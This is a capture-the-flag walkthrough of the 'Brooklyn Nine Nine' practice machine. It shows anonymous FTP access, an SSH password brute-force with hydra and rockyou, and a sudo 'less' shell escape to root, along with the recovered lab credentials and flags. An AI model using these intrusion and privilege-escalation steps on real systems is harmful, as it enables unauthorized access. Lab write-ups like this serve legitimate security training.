# Brooklyn Nine Nine

## Description

This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

## Initial Scan

Let's start with an Nmap scan. The scan reveals three open ports:
* 21 ftp
* 22 ssh
* 80 http

~~~
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.2.173
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## FTP

Let's start with the ftp service since anonymous login is allowed. There is only a txt file there. I downloaded it and read the content:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Brooklyn_Nine_Nine/files]
└─$ ftp $IP        
Connected to 10.10.141.151.
220 (vsFTPd 3.0.3)
Name (10.10.141.151:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.08 secs (1.4535 kB/s)
ftp> exit
221 Goodbye.
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Brooklyn_Nine_Nine/files]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
~~~

We obtained three usernames from this file:
* Amy
* Jake
* Holt

Btw, it seems like user `jake` has a weak password, so we might be able to brute-force his password.

## Brute-forcing SSH

I used `hydra` and rockyou wordlist to brute-force Jake's password:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Brooklyn_Nine_Nine/files]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://$IP
Hydra v9.3-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-27 07:40:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.141.151:22/
[22][ssh] host: 10.10.141.151   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
~~~

Great! We have credentials to log into SSH service:
* Username: jake
* Password: 987654321

## User Flag

I logged on ssh service using the creds (`jake:987654321`) and started looking for the user flag. I found the user flag in `/home/holt`:

~~~
jake@brookly_nine_nine:~$ cd /home/holt
jake@brookly_nine_nine:/home/holt$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee
~~~

User flag: `ee11cbb19052e40b07aac0ca060c23ee`

## Root Flag

Now we need to obtain the root flag. I ran `sudo -l` to check my permissions and can run `less` with sudo and no password:

~~~
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
~~~

We have to ways of using thio. The first one is to simply run the following command and read the root flag:

~~~
sudo less /root/root.txt
~~~

Or we can fully go root because `less` allows us to run shell commands by entering `!` followed by a command. We can simply run `/bin/bash` and since we have ran it with sudo, it will spawn us a root shell. Let's see the steps:

First choose a random file to read (I chose user.txt) then run this command:

~~~
jake@brookly_nine_nine:/home/holt$ sudo less user.txt
~~~

Then type the following and press enter:

~~~
!/bin/bash
~~~

And now we are root! Let's head to `/root` and read the root flag:

~~~
root@brookly_nine_nine:/home/holt# id
uid=0(root) gid=0(root) groups=0(root)
root@brookly_nine_nine:/home/holt# cd /root
root@brookly_nine_nine:/root# cat root.txt 
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
~~~

Root flag: `63a9f0ea7bb98050796b649e85481845`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun!

And have a good one! : )